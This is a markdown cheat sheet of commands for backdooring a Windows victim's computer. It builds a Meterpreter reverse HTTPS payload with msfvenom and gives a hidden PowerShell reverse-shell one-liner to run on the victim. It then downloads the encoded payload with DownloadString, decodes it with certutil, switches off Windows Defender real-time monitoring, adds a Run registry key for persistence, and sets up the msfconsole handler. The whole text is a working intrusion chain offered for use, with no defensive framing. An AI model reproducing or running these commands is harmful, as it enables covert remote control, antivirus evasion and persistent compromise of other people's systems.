
## Create Backdoor
```
msfvenom -p windows/meterpreter/reverse_https lhost=[LISTENER_IP_ADDRESS] lport=[PORT]  -f exe -o backdoor.exe
```
## Encode Backdoor
Go to [Here](https://www.base64encode.org) to Encode Backdoor

## Netcat
``` bash
nc -lvnp [PORT]
```
## Victim
Run this in Victim Computer
``` powershell
powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('[LISTENER_IP_ADDRESS]', [PORT]);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
```
## Make Directory
Make Directory to save backdoor
``` powershell
mkdir C:\Users\[User_name]\AppData\LocalLow\Temp
```
## Use python to make server

``` powershell 
python -m http.server
```
## Download String base64 backdoor
Download String From Your Server Python
``` powershell
(New-Object System.Net.WebClient).DownloadString("http://192.x.x.x:8000/file-encode.txt") > file.txt
```
## Disable Windows Defender
``` powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```
## Ddecode Base64

``` powershell
certutil -decode C:\Users\[USER_NAME]\AppData\LocalLow\Temp\file-encode.txt c:\Users\[USER_NAME]\AppData\LocalLow\Temp\decode.exe
```
## Create Regkey
Create a Regkey to execute Backdoor when start Windows 
``` powershell
New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "Sys" -Value "C:\Users\[USER_NAME]\AppData\LocalLow\Temp\decode.exe" -PropertyType "String"
```
## Msfconsole
Run msfconsole

- Use exploit handler
``` msfconsole
use exploit/multi/handler
``` 
- Set Payload
``` msfconsole
set payload windows/meterpreter/reverse_https
```
- Set lhost
``` msfconsole
set lhost [LISTENER_IP_ADDRESS] 
```
- Set lport
``` msfconsole
set lport [PORT]
```
- Set ExitOnSession
```
set ExitOnSession false
```
- Exploit
``` msfconsole
exploit -j
```
## Unlock Backdoor
```powershell
Unblock-File -Path C:\Users\[USER_NAME]\AppData\LocalLow\Temp\decode.exe
```
## Execute Backdoor
```powershell
./decode.exe
```
